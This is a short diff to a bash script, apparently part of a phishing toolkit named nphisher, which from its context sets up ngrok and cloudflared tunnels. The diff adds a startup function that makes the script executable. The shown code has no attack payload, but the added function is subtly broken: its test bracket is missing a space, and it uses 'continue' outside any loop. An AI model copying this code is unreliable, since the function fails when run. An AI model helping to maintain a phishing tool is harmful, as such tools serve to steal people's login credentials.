@@ -178,6 +178,16 @@ download_cloudflared() {
         fi
 }
 
+#check whether execute permission is granted
+xpermission(){
+if [ -x nphisher.sh];
+        then
+        continue
+else
+        chmod 0755 nphisher.sh
+fi
+}
+
 ## Install ngrok
 install_ngrok() {
         if [[ -e ".server/ngrok" ]]; then
@@ -1692,6 +1702,7 @@ cbanner
 directories
 kill_pid
 dependencies
+xpermission
 install_ngrok
 install_cloudflared
 clear
